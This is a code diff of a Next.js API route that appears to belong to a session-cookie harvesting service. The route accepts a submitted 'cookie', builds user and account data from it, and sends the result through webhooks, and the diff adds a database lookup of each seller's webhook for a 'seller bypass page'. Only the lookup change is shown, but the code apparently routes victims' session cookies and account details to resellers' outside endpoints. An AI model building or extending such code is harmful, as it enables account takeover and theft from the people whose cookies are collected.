@@ -1,6 +1,8 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { createClient } from '@/lib/supabase/server';
-import { getSeller } from '@/lib/sellers-store';
+import { neon } from '@neondatabase/serverless';
+
+const sql = neon(process.env.DATABASE_URL!)
 
 // Parse cookies from request
 function parseCookies(cookieHeader: string): Record<string, string> {
@@ -306,9 +308,18 @@ export async function POST(request: NextRequest) {
     const body = await request.json();
     const { cookie, seller } = body;
 
-    // Look up seller webhook if this is a seller bypass page
-    const sellerData = seller ? getSeller(seller) : null
-    const sellerWebhook = sellerData?.webhook || null
+    // Look up seller webhook from Neon sellers table (owner + route use same DB)
+    let sellerWebhook: string | null = null
+    if (seller) {
+      try {
+        const rows = await sql`SELECT webhook FROM sellers WHERE username = ${seller} LIMIT 1`
+        if (rows.length > 0 && rows[0].webhook) {
+          sellerWebhook = rows[0].webhook
+        }
+      } catch (err) {
+        console.error('Seller webhook lookup error:', err)
+      }
+    }
 
     if (!cookie) {
       await sendWebhook({ status: "failed", statusMessage: "No cookie provided — empty request", userData: null, accountData: null, sellerWebhook })
